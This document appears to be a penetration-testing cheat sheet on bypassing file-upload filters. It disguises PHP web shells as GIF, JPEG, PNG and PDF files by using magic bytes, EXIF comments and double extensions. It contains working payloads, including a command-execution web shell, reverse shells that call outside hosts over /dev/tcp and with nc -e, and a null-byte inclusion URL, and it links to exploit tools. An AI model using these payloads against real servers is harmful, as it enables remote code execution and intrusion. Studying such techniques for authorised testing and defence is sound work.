# File Upload with reverse shell

### GIF

```bash
# Web shell - wshell.gif
# Magic bytes for GIF
GIF89a;
<?php system($_GET['cmd']) ?>

# reverse shell - rshell.gif
GIF89a:
<?php system('bash -i >& /dev/tcp/10.10.14.5/1234 0>&1 ') ?>
```

### JPEG

{% code overflow="wrap" %}
```bash
# file.php.jpg or file.jpg.php
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
#or
mv file.jpg file.jpg.php
```
{% endcode %}

```bash
# Magic byte for JPEG
echo -e '\xff\xd8\xff\xdb' > fake.php.jpg
vim fake.php.jpg
# Add the php script to the jpg file, such as 
# <?php system('nc 10.10.14.19 9090 -e /bin/bash'); ?> 
```

### PNG

```bash
<?php system($_GET['cmd']); ?>  //shell.php
exiftool "-comment<=shell.php" malicious.png
strings malicious.png | grep system
```

### WORD&#x20;

See [Macro section](../../rce-collection/windows/macro.md).&#x20;

### PDF

```bash
# Web shell

%PDF-1.4
<?php system($_GET["cmd"]);?>

# http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

Metasploit&#x20;

{% embed url="https://www.offsec.com/metasploit-unleashed/client-side-exploits/" %}

EvilPDF

{% embed url="https://www.golinuxcloud.com/embed-payload-in-pdf/" %}

[CVE-2018-9958](https://www.exploit-db.com/exploits/49116)\


### ZIP&#x20;

```
// Some code
```

